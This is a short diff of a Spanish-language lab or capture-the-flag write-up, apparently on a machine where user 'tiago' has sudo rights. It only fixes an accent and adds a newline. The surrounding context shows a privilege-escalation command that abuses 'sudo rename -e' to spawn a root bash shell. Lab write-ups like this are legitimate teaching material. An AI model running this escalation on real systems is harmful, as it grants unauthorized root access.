@@ -335,7 +335,7 @@ User tiago may run the following commands on remote:
 
 Ahora si tenemos un vector de ataque claro para conseguir acceso como **root**.
 
-Lo primero que haremos sera crear un fichero para usar como dummy y nos permita el uso de *rename*.
+Lo primero que haremos será crear un fichero para usar como dummy y nos permita el uso de *rename*.
 
 ```bash
 touch test.txt
@@ -348,3 +348,4 @@ sudo rename -e 'system("/bin/bash")' test.txt
 ```
 
 Con esto ya tenemos comprometida la maquina.
+
